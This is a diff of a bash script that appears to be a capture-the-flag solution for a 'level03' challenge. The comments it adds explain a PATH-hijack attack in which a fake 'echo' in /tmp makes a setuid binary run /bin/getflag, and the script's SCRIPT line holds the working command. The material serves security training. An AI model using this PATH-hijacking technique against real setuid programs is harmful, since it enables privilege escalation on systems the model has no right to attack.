@@ -1,5 +1,9 @@
 #!/usr/bin/env bash
 
+# There is a file called level03 in the home directory of level03 which is an executable
+# When ran "strings" you can see that it uses echo: /usr/bin/env echo Exploit me
+# So we can create a script that will be ran instead of echo and add it to the PATH
+
 SCRIPT="echo \"/bin/getflag\" > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp;./level03"
 
 if [ ! -z "$1" ] && [ ! -z "$2" ] && [ ! -z "$3" ] ; then
